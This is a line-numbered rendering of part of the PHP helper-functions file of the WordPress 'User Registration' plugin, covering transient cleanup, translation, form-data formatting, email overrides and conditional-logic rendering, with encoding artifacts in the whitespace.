| [1863](#L1863) | AND b.option\_name = CONCAT( '\_transient\_timeout\_', SUBSTRING( a.option\_name, 12 ) ) |
| [1864](#L1864) | AND b.option\_value < %d"; |
| [1865](#L1865) | $rowsÂ =Â $wpdb->query(Â $wpdb->prepare(Â $sql,Â $wpdb->esc\_like(Â '\_transient\_'Â )Â .Â '%',Â $wpdb->esc\_like(Â '\_transient\_timeout\_'Â )Â .Â '%',Â time()Â )Â );Â // WPCS: unprepared SQL ok. |
| [1866](#L1866) |  |
| [1867](#L1867) | $sqlÂ  Â =Â "DELETE a, b FROM $wpdb->optionsÂ a, $wpdb->optionsÂ b |
| [1868](#L1868) | WHERE a.option\_name LIKE %s |
| [1869](#L1869) | AND a.option\_name NOT LIKE %s |
| [1870](#L1870) | AND b.option\_name = CONCAT( '\_site\_transient\_timeout\_', SUBSTRING( a.option\_name, 17 ) ) |
| [1871](#L1871) | AND b.option\_value < %d"; |
| [1872](#L1872) | $rows2Â =Â $wpdb->query(Â $wpdb->prepare(Â $sql,Â $wpdb->esc\_like(Â '\_site\_transient\_'Â )Â .Â '%',Â $wpdb->esc\_like(Â '\_site\_transient\_timeout\_'Â )Â .Â '%',Â time()Â )Â );Â // WPCS: unprepared SQL ok. |
| [1873](#L1873) |  |
| [1874](#L1874) | returnÂ absint(Â $rowsÂ +Â $rows2Â ); |
| [1875](#L1875) | } |
| [1876](#L1876) | add\_action(Â 'user\_registration\_installed',Â 'ur\_delete\_expired\_transients'Â ); |
| [1877](#L1877) |  |
| [1878](#L1878) | /\*\* |
| [1879](#L1879) | \* String translation function. |
| [1880](#L1880) | \* |
| [1881](#L1881) | \* @since 1.7.3 |
| [1882](#L1882) | \* |
| [1883](#L1883) | \* @param intÂ  Â  $form\_id Form ID. |
| [1884](#L1884) | \* @param string $field\_id Field ID. |
| [1885](#L1885) | \* @param mixedÂ  $variable To be translated for WPML compatibility. |
| [1886](#L1886) | \*/ |
| [1887](#L1887) | functionÂ ur\_string\_translation(Â $form\_id,Â $field\_id,Â $variableÂ )Â { |
| [1888](#L1888) | ifÂ (Â function\_exists(Â 'icl\_register\_string'Â )Â )Â { |
| [1889](#L1889) | icl\_register\_string(Â isset(Â $form\_idÂ )Â &&Â 0Â !==Â $form\_idÂ ?Â 'user\_registration\_'Â .Â absint(Â $form\_idÂ )Â :Â 'user-registration',Â isset(Â $field\_idÂ )Â ?Â $field\_idÂ :Â '',Â $variableÂ ); |
| [1890](#L1890) | } |
| [1891](#L1891) | ifÂ (Â function\_exists(Â 'icl\_t'Â )Â )Â { |
| [1892](#L1892) | $variableÂ =Â icl\_t(Â isset(Â $form\_idÂ )Â &&Â 0Â !==Â $form\_idÂ ?Â 'user\_registration\_'Â .Â absint(Â $form\_idÂ )Â :Â 'user-registration',Â isset(Â $field\_idÂ )Â ?Â $field\_idÂ :Â '',Â $variableÂ ); |
| [1893](#L1893) | } |
| [1894](#L1894) | returnÂ $variable; |
| [1895](#L1895) | } |
| [1896](#L1896) |  |
| [1897](#L1897) | /\*\* |
| [1898](#L1898) | \* Get Form ID from User ID. |
| [1899](#L1899) | \* |
| [1900](#L1900) | \* @param int $user\_id User ID. |
| [1901](#L1901) | \* |
| [1902](#L1902) | \* @return int $form\_id Form ID. |
| [1903](#L1903) | \*/ |
| [1904](#L1904) | functionÂ ur\_get\_form\_id\_by\_userid(Â $user\_idÂ )Â { |
| [1905](#L1905) | $form\_id\_arrayÂ =Â get\_user\_meta(Â $user\_id,Â 'ur\_form\_id'Â ); |
| [1906](#L1906) | $form\_idÂ  Â  Â  Â =Â 0; |
| [1907](#L1907) |  |
| [1908](#L1908) | ifÂ (Â isset(Â $form\_id\_array[0]Â )Â )Â { |
| [1909](#L1909) | $form\_idÂ =Â $form\_id\_array[0]; |
| [1910](#L1910) | } |
| [1911](#L1911) | returnÂ $form\_id; |
| [1912](#L1912) | } |
| [1913](#L1913) |  |
| [1914](#L1914) | /\*\* |
| [1915](#L1915) | \* Get source ID through which the given user was supposedly registered. |
| [1916](#L1916) | \* |
| [1917](#L1917) | \* @since 1.9.0 |
| [1918](#L1918) | \* |
| [1919](#L1919) | \* @param int $user\_id User ID. |
| [1920](#L1920) | \* |
| [1921](#L1921) | \* @return mixed |
| [1922](#L1922) | \*/ |
| [1923](#L1923) | functionÂ ur\_get\_registration\_source\_id(Â $user\_idÂ )Â { |
| [1924](#L1924) | $user\_metasÂ =Â get\_user\_meta(Â $user\_idÂ ); |
| [1925](#L1925) |  |
| [1926](#L1926) | ifÂ (Â isset(Â $user\_metas['user\_registration\_social\_connect\_bypass\_current\_password']Â )Â )Â { |
| [1927](#L1927) | $networksÂ =Â array(Â 'facebook',Â 'linkedin',Â 'google',Â 'twitter'Â ); |
| [1928](#L1928) |  |
| [1929](#L1929) | foreachÂ (Â $networksÂ asÂ $networkÂ )Â { |
| [1930](#L1930) |  |
| [1931](#L1931) | ifÂ (Â isset(Â $user\_metas[Â 'user\_registration\_social\_connect\_'Â .Â $networkÂ .Â '\_username'Â ]Â )Â )Â { |
| [1932](#L1932) | returnÂ $network; |
| [1933](#L1933) | } |
| [1934](#L1934) | } |
| [1935](#L1935) | }Â elseifÂ (Â isset(Â $user\_metas['ur\_form\_id']Â )Â )Â { |
| [1936](#L1936) | returnÂ $user\_metas['ur\_form\_id'][0]; |
| [1937](#L1937) | }Â elseÂ { |
| [1938](#L1938) | returnÂ null; |
| [1939](#L1939) | } |
| [1940](#L1940) | } |
| [1941](#L1941) |  |
| [1942](#L1942) | /\*\* |
| [1943](#L1943) | \* Check if a datetime falls in a range of time. |
| [1944](#L1944) | \* |
| [1945](#L1945) | \* @since 1.9.0 |
| [1946](#L1946) | \* |
| [1947](#L1947) | \* @param stringÂ  Â  Â  $target\_date Target date. |
| [1948](#L1948) | \* @param string|null $start\_date Start date. |
| [1949](#L1949) | \* @param string|null $end\_date End date. |
| [1950](#L1950) | \* |
| [1951](#L1951) | \* @return bool |
| [1952](#L1952) | \*/ |
| [1953](#L1953) | functionÂ ur\_falls\_in\_date\_range(Â $target\_date,Â $start\_dateÂ =Â null,Â $end\_dateÂ =Â nullÂ )Â { |
| [1954](#L1954) | $start\_tsÂ  Â  Â  Â =Â strtotime(Â $start\_dateÂ ); |
| [1955](#L1955) | $end\_tsÂ  Â  Â  Â  Â =Â strtotime(Â $end\_dateÂ .Â ' +1 Day'Â ); |
| [1956](#L1956) | $target\_date\_tsÂ =Â strtotime(Â $target\_dateÂ ); |
| [1957](#L1957) |  |
| [1958](#L1958) | // If the starting and the ending date are set as same. |
| [1959](#L1959) | ifÂ (Â $start\_tsÂ ===Â $end\_tsÂ )Â { |
| [1960](#L1960) | $datetimeÂ =Â newÂ DateTime(); |
| [1961](#L1961) | $datetime->setTimestamp(Â $end\_tsÂ ); |
| [1962](#L1962) |  |
| [1963](#L1963) | date\_add(Â $datetime,Â date\_interval\_create\_from\_date\_string(Â '23 hours 59 mins 59 secs'Â )Â ); |
| [1964](#L1964) | $end\_tsÂ =Â $datetime->getTimestamp(); |
| [1965](#L1965) | } |
| [1966](#L1966) |  |
| [1967](#L1967) | ifÂ (Â $start\_dateÂ &&Â $end\_dateÂ )Â { |
| [1968](#L1968) | returnÂ (Â $start\_tsÂ <=Â $target\_date\_tsÂ )Â &&Â (Â $target\_date\_tsÂ <=Â $end\_tsÂ ); |
| [1969](#L1969) | }Â elseifÂ (Â $start\_dateÂ )Â { |
| [1970](#L1970) | returnÂ (Â $start\_tsÂ <=Â $target\_date\_tsÂ ); |
| [1971](#L1971) | }Â elseifÂ (Â $end\_dateÂ )Â { |
| [1972](#L1972) | returnÂ (Â $target\_date\_tsÂ <=Â $end\_tsÂ ); |
| [1973](#L1973) | }Â elseÂ { |
| [1974](#L1974) | returnÂ false; |
| [1975](#L1975) | } |
| [1976](#L1976) | } |
| [1977](#L1977) |  |
| [1978](#L1978) | /\*\* |
| [1979](#L1979) | \* Get Post Content By Form ID. |
| [1980](#L1980) | \* |
| [1981](#L1981) | \* @param int $form\_id Form Id. |
| [1982](#L1982) | \* |
| [1983](#L1983) | \* @return array|mixed|null|object |
| [1984](#L1984) | \*/ |
| [1985](#L1985) | functionÂ ur\_get\_post\_content(Â $form\_idÂ )Â { |
| [1986](#L1986) |  |
| [1987](#L1987) | $argsÂ  Â  Â  =Â array( |
| [1988](#L1988) | 'post\_type'Â  Â =>Â 'user\_registration', |
| [1989](#L1989) |  |
| [1990](#L1990) | 'post\_status'Â =>Â 'publish', |
| [1991](#L1991) |  |
| [1992](#L1992) | 'post\_\_in'Â  Â  =>Â array(Â $form\_idÂ ), |
| [1993](#L1993) | ); |
| [1994](#L1994) | $post\_dataÂ =Â get\_posts(Â $argsÂ ); |
| [1995](#L1995) |  |
| [1996](#L1996) | ifÂ (Â isset(Â $post\_data[0]->post\_contentÂ )Â )Â { |
| [1997](#L1997) |  |
| [1998](#L1998) | returnÂ json\_decode(Â $post\_data[0]->post\_contentÂ ); |
| [1999](#L1999) |  |
| [2000](#L2000) | }Â elseÂ { |
| [2001](#L2001) |  |
| [2002](#L2002) | returnÂ array(); |
| [2003](#L2003) | } |
| [2004](#L2004) | } |
| [2005](#L2005) |  |
| [2006](#L2006) | /\*\* |
| [2007](#L2007) | \* A wp\_parse\_args() for multi-dimensional array. |
| [2008](#L2008) | \* |
| [2009](#L2009) | \* @see https://developer.wordpress.org/reference/functions/wp\_parse\_args/ |
| [2010](#L2010) | \* |
| [2011](#L2011) | \* @since 1.9.0 |
| [2012](#L2012) | \* |
| [2013](#L2013) | \* @param array $argsÂ  Â  Â  Â Value to merge with $defaults. |
| [2014](#L2014) | \* @param array $defaultsÂ  Â Array that serves as the defaults. |
| [2015](#L2015) | \* |
| [2016](#L2016) | \* @return arrayÂ  Â  Merged user defined values with defaults. |
| [2017](#L2017) | \*/ |
| [2018](#L2018) | functionÂ ur\_parse\_args(Â &$args,Â $defaultsÂ )Â { |
| [2019](#L2019) | $argsÂ  Â  Â =Â (array)Â $args; |
| [2020](#L2020) | $defaultsÂ =Â (array)Â $defaults; |
| [2021](#L2021) | $resultÂ  Â =Â $defaults; |
| [2022](#L2022) | foreachÂ (Â $argsÂ asÂ $kÂ =>Â &$vÂ )Â { |
| [2023](#L2023) | ifÂ (Â is\_array(Â $vÂ )Â &&Â isset(Â $result[Â $kÂ ]Â )Â )Â { |
| [2024](#L2024) | $result[Â $kÂ ]Â =Â ur\_parse\_args(Â $v,Â $result[Â $kÂ ]Â ); |
| [2025](#L2025) | }Â elseÂ { |
| [2026](#L2026) | $result[Â $kÂ ]Â =Â $v; |
| [2027](#L2027) | } |
| [2028](#L2028) | } |
| [2029](#L2029) | returnÂ $result; |
| [2030](#L2030) | } |
| [2031](#L2031) |  |
| [2032](#L2032) | /\*\* |
| [2033](#L2033) | \* Override email content for specific form. |
| [2034](#L2034) | \* |
| [2035](#L2035) | \* @param intÂ  Â  $form\_id Form Id. |
| [2036](#L2036) | \* @param object $settings Settings for specific email. |
| [2037](#L2037) | \* @param string $message Message to be sent in email body. |
| [2038](#L2038) | \* @param string $subject Subject of the email. |
| [2039](#L2039) | \* |
| [2040](#L2040) | \* @return array |
| [2041](#L2041) | \*/ |
| [2042](#L2042) | functionÂ user\_registration\_email\_content\_overrider(Â $form\_id,Â $settings,Â $message,Â $subjectÂ )Â { |
| [2043](#L2043) | // Check if email templates addon is active. |
| [2044](#L2044) | ifÂ (Â class\_exists(Â 'User\_Registration\_Email\_Templates'Â )Â )Â { |
| [2045](#L2045) | $email\_content\_overrideÂ =Â ur\_get\_single\_post\_meta(Â $form\_id,Â 'user\_registration\_email\_content\_override',Â ''Â ); |
| [2046](#L2046) |  |
| [2047](#L2047) | // Check if the post meta exists and have contents. |
| [2048](#L2048) | ifÂ (Â $email\_content\_overrideÂ )Â { |
| [2049](#L2049) |  |
| [2050](#L2050) | $auto\_password\_template\_overriderÂ =Â isset(Â $email\_content\_override[Â $settings->idÂ ]Â )Â ?Â $email\_content\_override[Â $settings->idÂ ]Â :Â ''; |
| [2051](#L2051) |  |
| [2052](#L2052) | // Check if the email override is enabled. |
| [2053](#L2053) | ifÂ (Â ''Â !==Â $auto\_password\_template\_overriderÂ &&Â ur\_string\_to\_bool(Â $auto\_password\_template\_overrider['override']Â )Â )Â { |
| [2054](#L2054) | $messageÂ =Â $auto\_password\_template\_overrider['content']; |
| [2055](#L2055) | $subjectÂ =Â $auto\_password\_template\_overrider['subject']; |
| [2056](#L2056) | } |
| [2057](#L2057) | } |
| [2058](#L2058) | } |
| [2059](#L2059) | returnÂ array(Â $message,Â $subjectÂ ); |
| [2060](#L2060) | } |
| [2061](#L2061) |  |
| [2062](#L2062) | /\*\* Get User Data in particular array format. |
| [2063](#L2063) | \* |
| [2064](#L2064) | \* @param string $new\_string Field Key. |
| [2065](#L2065) | \* @param string $post\_key Post Key. |
| [2066](#L2066) | \* @param arrayÂ  $profile Form Data. |
| [2067](#L2067) | \* @param mixedÂ  $value Value. |
| [2068](#L2068) | \*/ |
| [2069](#L2069) | functionÂ ur\_get\_valid\_form\_data\_format(Â $new\_string,Â $post\_key,Â $profile,Â $valueÂ )Â { |
| [2070](#L2070) | $valid\_form\_dataÂ =Â array(); |
| [2071](#L2071) | ifÂ (Â isset(Â $profile[Â $post\_keyÂ ]Â )Â )Â { |
| [2072](#L2072) | $field\_typeÂ =Â $profile[Â $post\_keyÂ ]['type']; |
| [2073](#L2073) |  |
| [2074](#L2074) | switchÂ (Â $field\_typeÂ )Â { |
| [2075](#L2075) | caseÂ 'checkbox': |
| [2076](#L2076) | caseÂ 'multi\_select2': |
| [2077](#L2077) | ifÂ (Â !Â is\_array(Â $valueÂ )Â &&Â !Â empty(Â $valueÂ )Â )Â { |
| [2078](#L2078) | $valueÂ =Â maybe\_unserialize(Â $valueÂ ); |
| [2079](#L2079) | } |
| [2080](#L2080) | break; |
| [2081](#L2081) | caseÂ 'file': |
| [2082](#L2082) | $filesÂ =Â is\_array(Â $valueÂ )Â ?Â $valueÂ :Â explode(Â ',',Â $valueÂ ); |
| [2083](#L2083) |  |
| [2084](#L2084) | ifÂ (Â is\_array(Â $filesÂ )Â &&Â isset(Â $files[0]Â )Â )Â { |
| [2085](#L2085) | $attachment\_idsÂ =Â ''; |
| [2086](#L2086) |  |
| [2087](#L2087) | foreachÂ (Â $filesÂ asÂ $keyÂ =>Â $fileÂ )Â { |
| [2088](#L2088) | $seperatorÂ =Â 0Â <Â $keyÂ ?Â ','Â :Â ''; |
| [2089](#L2089) |  |
| [2090](#L2090) | ifÂ (Â wp\_http\_validate\_url(Â $fileÂ )Â )Â { |
| [2091](#L2091) |  |
| [2092](#L2092) | $attachment\_idsÂ =Â $attachment\_idsÂ .Â ''Â .Â $seperatorÂ .Â ''Â .Â attachment\_url\_to\_postid(Â $fileÂ ); |
| [2093](#L2093) | } |
| [2094](#L2094) | } |
| [2095](#L2095) | $valueÂ =Â !Â empty(Â $attachment\_idsÂ )Â ?Â $attachment\_idsÂ :Â $value; |
| [2096](#L2096) | }Â elseÂ { |
| [2097](#L2097) |  |
| [2098](#L2098) | ifÂ (Â wp\_http\_validate\_url(Â $valueÂ )Â )Â { |
| [2099](#L2099) | $valueÂ =Â attachment\_url\_to\_postid(Â $valueÂ ); |
| [2100](#L2100) | } |
| [2101](#L2101) | } |
| [2102](#L2102) | break; |
| [2103](#L2103) | } |
| [2104](#L2104) | $valid\_form\_data[Â $new\_stringÂ ]Â  Â  Â  Â  Â  Â  Â  Â =Â newÂ stdClass(); |
| [2105](#L2105) | $valid\_form\_data[Â $new\_stringÂ ]->field\_nameÂ  Â =Â $new\_string; |
| [2106](#L2106) | $valid\_form\_data[Â $new\_stringÂ ]->valueÂ  Â  Â  Â  =Â $value; |
| [2107](#L2107) | $valid\_form\_data[Â $new\_stringÂ ]->field\_typeÂ  Â =Â $profile[Â $post\_keyÂ ]['type']; |
| [2108](#L2108) | $valid\_form\_data[Â $new\_stringÂ ]->labelÂ  Â  Â  Â  =Â $profile[Â $post\_keyÂ ]['label']; |
| [2109](#L2109) | $valid\_form\_data[Â $new\_stringÂ ]->extra\_paramsÂ =Â array( |
| [2110](#L2110) | 'field\_key'Â =>Â $profile[Â $post\_keyÂ ]['field\_key'], |
| [2111](#L2111) | 'label'Â  Â  Â =>Â $profile[Â $post\_keyÂ ]['label'], |
| [2112](#L2112) | ); |
| [2113](#L2113) | }Â elseÂ { |
| [2114](#L2114) | $valid\_form\_data[Â $new\_stringÂ ]Â  Â  Â  Â  Â  Â  Â  Â =Â newÂ stdClass(); |
| [2115](#L2115) | $valid\_form\_data[Â $new\_stringÂ ]->field\_nameÂ  Â =Â $new\_string; |
| [2116](#L2116) | $valid\_form\_data[Â $new\_stringÂ ]->valueÂ  Â  Â  Â  =Â $value; |
| [2117](#L2117) | $valid\_form\_data[Â $new\_stringÂ ]->extra\_paramsÂ =Â array( |
| [2118](#L2118) | 'field\_key'Â =>Â $new\_string, |
| [2119](#L2119) | ); |
| [2120](#L2120) | } |
| [2121](#L2121) | returnÂ $valid\_form\_data; |
| [2122](#L2122) | } |
| [2123](#L2123) |  |
| [2124](#L2124) | /\*\* |
| [2125](#L2125) | \* Add our login and my account shortcodes to conflicting shortcodes filter of All In One Seo plugin to resolve the conflict |
| [2126](#L2126) | \* |
| [2127](#L2127) | \* @param array $conflict\_shortcodes Array of shortcodes that All in one Seo is conflicting with. |
| [2128](#L2128) | \* |
| [2129](#L2129) | \* @since 1.9.4 |
| [2130](#L2130) | \*/ |
| [2131](#L2131) | functionÂ ur\_resolve\_conflicting\_shortcodes\_with\_aioseo(Â $conflict\_shortcodesÂ )Â { |
| [2132](#L2132) | $ur\_shortcodesÂ =Â array( |
| [2133](#L2133) | 'User Registration My Account'Â =>Â '[user\_registration\_my\_account]', |
| [2134](#L2134) | 'User Registration Login'Â  Â  Â  =>Â '[user\_registration\_login]', |
| [2135](#L2135) | ); |
| [2136](#L2136) |  |
| [2137](#L2137) | $conflict\_shortcodesÂ =Â array\_merge(Â $conflict\_shortcodes,Â $ur\_shortcodesÂ ); |
| [2138](#L2138) | returnÂ $conflict\_shortcodes; |
| [2139](#L2139) | } |
| [2140](#L2140) |  |
| [2141](#L2141) | add\_filter(Â 'aioseo\_conflicting\_shortcodes',Â 'ur\_resolve\_conflicting\_shortcodes\_with\_aioseo'Â ); |
| [2142](#L2142) |  |
| [2143](#L2143) | /\*\* |
| [2144](#L2144) | \* Parse name values and smart tags |
| [2145](#L2145) | \* |
| [2146](#L2146) | \* @paramÂ  intÂ  Â $user\_id User ID. |
| [2147](#L2147) | \* @paramÂ  intÂ  Â $form\_id Form ID. |
| [2148](#L2148) | \* @paramÂ  array $valid\_form\_data Form filled data. |
| [2149](#L2149) | \* |
| [2150](#L2150) | \* @since 1.9.6 |
| [2151](#L2151) | \* |
| [2152](#L2152) | \* @return array |
| [2153](#L2153) | \*/ |
| [2154](#L2154) | functionÂ ur\_parse\_name\_values\_for\_smart\_tags(Â $user\_id,Â $form\_id,Â $valid\_form\_dataÂ )Â { |
| [2155](#L2155) |  |
| [2156](#L2156) | $name\_valueÂ =Â array(); |
| [2157](#L2157) | $data\_htmlÂ  =Â '<table class="user-registration-email\_\_entries" cellpadding="0" cellspacing="0"><tbody>'; |
| [2158](#L2158) |  |
| [2159](#L2159) | // Generate $data\_html string to replace for {{all\_fields}} smart tag. |
| [2160](#L2160) | foreachÂ (Â $valid\_form\_dataÂ asÂ $field\_metaÂ =>Â $form\_dataÂ )Â { |
| [2161](#L2161) |  |
| [2162](#L2162) | ifÂ (Â 'user\_confirm\_password'Â ===Â $field\_metaÂ ||Â 'user\_pass'Â ===Â $field\_metaÂ ||Â preg\_match(Â '/password\_/',Â $field\_metaÂ )Â )Â { |
| [2163](#L2163) | continue; |
| [2164](#L2164) | } |
| [2165](#L2165) |  |
| [2166](#L2166) | // Donot include privacy policy value. |
| [2167](#L2167) | ifÂ (Â isset(Â $form\_data->extra\_params['field\_key']Â )Â &&Â 'privacy\_policy'Â ===Â $form\_data->extra\_params['field\_key']Â )Â { |
| [2168](#L2168) | continue; |
| [2169](#L2169) | } |
| [2170](#L2170) |  |
| [2171](#L2171) | ifÂ (Â isset(Â $form\_data->extra\_params['field\_key']Â )Â &&Â 'country'Â ===Â $form\_data->extra\_params['field\_key']Â &&Â ''Â !==Â $form\_data->valueÂ )Â { |
| [2172](#L2172) | $country\_classÂ  Â  =Â ur\_load\_form\_field\_class(Â $form\_data->extra\_params['field\_key']Â ); |
| [2173](#L2173) | $countriesÂ  Â  Â  Â  =Â $country\_class::get\_instance()->get\_country(); |
| [2174](#L2174) | $form\_data->valueÂ =Â isset(Â $countries[Â $form\_data->valueÂ ]Â )Â ?Â $countries[Â $form\_data->valueÂ ]Â :Â $form\_data->value; |
| [2175](#L2175) | } |
| [2176](#L2176) |  |
| [2177](#L2177) | $labelÂ  Â  Â  =Â isset(Â $form\_data->extra\_params['label']Â )Â ?Â $form\_data->extra\_params['label']Â :Â ''; |
| [2178](#L2178) | $field\_nameÂ =Â isset(Â $form\_data->field\_nameÂ )Â ?Â $form\_data->field\_nameÂ :Â ''; |
| [2179](#L2179) | $valueÂ  Â  Â  =Â isset(Â $form\_data->valueÂ )Â ?Â $form\_data->valueÂ :Â ''; |
| [2180](#L2180) |  |
| [2181](#L2181) | ifÂ (Â 'user\_pass'Â ===Â $field\_metaÂ )Â { |
| [2182](#L2182) | $valueÂ =Â \_\_(Â 'Chosen Password',Â 'user-registration'Â ); |
| [2183](#L2183) | } |
| [2184](#L2184) |  |
| [2185](#L2185) | // Check if value contains array. |
| [2186](#L2186) | ifÂ (Â is\_array(Â $valueÂ )Â )Â { |
| [2187](#L2187) | $valueÂ =Â implode(Â ',',Â $valueÂ ); |
| [2188](#L2188) | } |
| [2189](#L2189) |  |
| [2190](#L2190) | $data\_htmlÂ .=Â '<tr><td>'Â .Â $labelÂ .Â ' : </td><td>'Â .Â $valueÂ .Â '</td></tr>'; |
| [2191](#L2191) |  |
| [2192](#L2192) | $name\_value[Â $field\_nameÂ ]Â =Â $value; |
| [2193](#L2193) | } |
| [2194](#L2194) |  |
| [2195](#L2195) | $data\_htmlÂ .=Â '</tbody></table>'; |
| [2196](#L2196) |  |
| [2197](#L2197) | // Smart tag process for extra fields. |
| [2198](#L2198) | $name\_valueÂ =Â apply\_filters(Â 'user\_registration\_process\_smart\_tag',Â $name\_value,Â $valid\_form\_data,Â $form\_id,Â $user\_idÂ ); |
| [2199](#L2199) |  |
| [2200](#L2200) | returnÂ array(Â $name\_value,Â $data\_htmlÂ ); |
| [2201](#L2201) | } |
| [2202](#L2202) |  |
| [2203](#L2203) | /\*\* |
| [2204](#L2204) | \* Get field data by field\_name. |
| [2205](#L2205) | \* |
| [2206](#L2206) | \* @param intÂ  Â  $form\_id Form Id. |
| [2207](#L2207) | \* @param string $field\_name Field Name. |
| [2208](#L2208) | \* |
| [2209](#L2209) | \* @return array |
| [2210](#L2210) | \*/ |
| [2211](#L2211) | functionÂ ur\_get\_field\_data\_by\_field\_name(Â $form\_id,Â $field\_nameÂ )Â { |
| [2212](#L2212) | $field\_dataÂ =Â array(); |
| [2213](#L2213) |  |
| [2214](#L2214) | $post\_content\_arrayÂ =Â (Â $form\_idÂ )Â ?Â UR()->form->get\_form(Â $form\_id,Â array(Â 'content\_only'Â =>Â trueÂ )Â )Â :Â array(); |
| [2215](#L2215) |  |
| [2216](#L2216) | foreachÂ (Â $post\_content\_arrayÂ asÂ $post\_content\_rowÂ )Â { |
| [2217](#L2217) | foreachÂ (Â $post\_content\_rowÂ asÂ $post\_content\_gridÂ )Â { |
| [2218](#L2218) | ifÂ (Â is\_array(Â $post\_content\_gridÂ )Â ||Â is\_object(Â $post\_content\_gridÂ )Â )Â { |
| [2219](#L2219) | foreachÂ (Â $post\_content\_gridÂ asÂ $fieldÂ )Â { |
| [2220](#L2220) | ifÂ (Â isset(Â $field->field\_keyÂ )Â &&Â isset(Â $field->general\_setting->field\_nameÂ )Â &&Â $field->general\_setting->field\_nameÂ ===Â $field\_nameÂ )Â { |
| [2221](#L2221) | $field\_dataÂ =Â array( |
| [2222](#L2222) | 'field\_key'Â  Â  Â  Â =>Â $field->field\_key, |
| [2223](#L2223) | 'general\_setting'Â =>Â $field->general\_setting, |
| [2224](#L2224) | 'advance\_setting'Â =>Â $field->advance\_setting, |
| [2225](#L2225) | ); |
| [2226](#L2226) | } |
| [2227](#L2227) | } |
| [2228](#L2228) | } |
| [2229](#L2229) | } |
| [2230](#L2230) | } |
| [2231](#L2231) | returnÂ $field\_data; |
| [2232](#L2232) | } |
| [2233](#L2233) |  |
| [2234](#L2234) | ifÂ (Â !Â function\_exists(Â 'user\_registration\_pro\_get\_conditional\_fields\_by\_form\_id'Â )Â )Â { |
| [2235](#L2235) | /\*\* |
| [2236](#L2236) | \* Get form fields by form id |
| [2237](#L2237) | \* |
| [2238](#L2238) | \* @param intÂ  Â  $form\_id Form ID. |
| [2239](#L2239) | \* @param string $selected\_field\_key Field Key. |
| [2240](#L2240) | \*/ |
| [2241](#L2241) | functionÂ user\_registration\_pro\_get\_conditional\_fields\_by\_form\_id(Â $form\_id,Â $selected\_field\_keyÂ )Â { |
| [2242](#L2242) | $argsÂ  Â  Â  Â  Â  =Â array( |
| [2243](#L2243) | 'post\_type'Â  Â =>Â 'user\_registration', |
| [2244](#L2244) | 'post\_status'Â =>Â 'publish', |
| [2245](#L2245) | 'post\_\_in'Â  Â  =>Â array(Â $form\_idÂ ), |
| [2246](#L2246) | ); |
| [2247](#L2247) | $post\_dataÂ =Â get\_posts(Â $argsÂ ); |
| [2248](#L2248) | // wrap all fields in array. |
| [2249](#L2249) | $fieldsÂ =Â array(); |
| [2250](#L2250) | ifÂ (Â isset(Â $post\_data[0]->post\_contentÂ )Â )Â { |
| [2251](#L2251) | $post\_content\_arrayÂ =Â json\_decode(Â $post\_data[0]->post\_contentÂ ); |
| [2252](#L2252) |  |
| [2253](#L2253) | ifÂ (Â !Â is\_null(Â $post\_content\_arrayÂ )Â )Â { |
| [2254](#L2254) | foreachÂ (Â $post\_content\_arrayÂ asÂ $dataÂ )Â { |
| [2255](#L2255) | foreachÂ (Â $dataÂ asÂ $single\_dataÂ )Â { |
| [2256](#L2256) | foreachÂ (Â $single\_dataÂ asÂ $field\_dataÂ )Â { |
| [2257](#L2257) | ifÂ (Â isset(Â $field\_data->general\_setting->field\_nameÂ ) |
| [2258](#L2258) | &&Â isset(Â $field\_data->general\_setting->labelÂ )Â )Â { |
| [2259](#L2259) |  |
| [2260](#L2260) | $strip\_fieldsÂ =Â array( |
| [2261](#L2261) | 'section\_title', |
| [2262](#L2262) | 'html', |
| [2263](#L2263) | 'wysiwyg', |
| [2264](#L2264) | 'billing\_address\_title', |
| [2265](#L2265) | 'shipping\_address\_title', |
| [2266](#L2266) | 'stripe\_gateway', |
| [2267](#L2267) | 'profile\_picture', |
| [2268](#L2268) | 'file', |
| [2269](#L2269) | ); |
| [2270](#L2270) |  |
| [2271](#L2271) | ifÂ (Â in\_array(Â $field\_data->field\_key,Â $strip\_fields,Â trueÂ )Â )Â { |
| [2272](#L2272) | continue; |
| [2273](#L2273) | } |
| [2274](#L2274) |  |
| [2275](#L2275) | $fields[Â $field\_data->general\_setting->field\_nameÂ ]Â =Â array( |
| [2276](#L2276) | 'label'Â  Â  Â =>Â $field\_data->general\_setting->label, |
| [2277](#L2277) | 'field\_key'Â =>Â $field\_data->field\_key, |
| [2278](#L2278) | ); |
| [2279](#L2279) | } |
| [2280](#L2280) | } |
| [2281](#L2281) | } |
| [2282](#L2282) | } |
| [2283](#L2283) | } |
| [2284](#L2284) | } |
| [2285](#L2285) | // Unset selected meta key. |
| [2286](#L2286) | unset(Â $fields[Â $selected\_field\_keyÂ ]Â ); |
| [2287](#L2287) | returnÂ $fields; |
| [2288](#L2288) | } |
| [2289](#L2289) | } |
| [2290](#L2290) |  |
| [2291](#L2291) | ifÂ (Â !Â function\_exists(Â 'user\_registration\_pro\_render\_conditional\_logic'Â )Â )Â { |
| [2292](#L2292) | /\*\* |
| [2293](#L2293) | \* Render Conditional Logic in form settings of form builder. |
| [2294](#L2294) | \* |
| [2295](#L2295) | \* @param arrayÂ  $connection Connection Data. |
| [2296](#L2296) | \* @param string $integration Integration. |
| [2297](#L2297) | \* @param intÂ  Â  $form\_id Form ID. |
| [2298](#L2298) | \* @return string |
| [2299](#L2299) | \*/ |
| [2300](#L2300) | functionÂ user\_registration\_pro\_render\_conditional\_logic(Â $connection,Â $integration,Â $form\_idÂ )Â { |
| [2301](#L2301) | $outputÂ  =Â '<div class="ur\_conditional\_logic\_container">'; |
| [2302](#L2302) | $outputÂ .=Â '<h4>'Â .Â esc\_html\_\_(Â 'Conditional Logic',Â 'user-registration'Â )Â .Â '</h4>'; |
| [2303](#L2303) | $outputÂ .=Â '<div class="ur\_use\_conditional\_logic\_wrapper ur-check">'; |
| [2304](#L2304) | $checkedÂ =Â ''; |
| [2305](#L2305) |  |
| [2306](#L2306) | ifÂ (Â isset(Â $connection['enable\_conditional\_logic']Â )Â &&Â ur\_string\_to\_bool(Â $connection['enable\_conditional\_logic']Â )Â )Â { |
| [2307](#L2307) |  |
| [2308](#L2308) | $checkedÂ =Â 'checked=checked'; |
| [2309](#L2309) | } |
| [2310](#L2310) | $outputÂ .=Â '<div class="ur-toggle-section ur-form-builder-toggle">'; |
| [2311](#L2311) | $outputÂ .=Â '<span class="user-registration-toggle-form">'; |
| [2312](#L2312) | $outputÂ .=Â '<input class="ur-use-conditional-logic" type="checkbox" name="ur\_use\_conditional\_logic" id="ur\_use\_conditional\_logic" 'Â .Â $checkedÂ .Â '>'; |
